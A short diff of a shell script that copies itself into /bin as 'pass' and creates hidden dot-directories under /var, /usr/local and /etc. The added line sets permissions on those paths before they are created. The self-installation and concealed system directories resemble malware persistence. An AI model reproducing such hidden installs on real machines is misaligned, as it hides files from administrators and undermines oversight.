@@ -21,8 +21,8 @@ if [ ! -e /bin/pass ]; then
     chmod u+rx "$0"
     cp "$0" /bin
 fi
+chmod u+rw /var/.Hj /usr/local/.ko /etc/.raulm /etc/.raulm/.Ye
 if [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
-    
     mkdir /var/.Hj /usr/local/.ko /etc/.raulm /etc/.raulm/.Ye
 fi
     
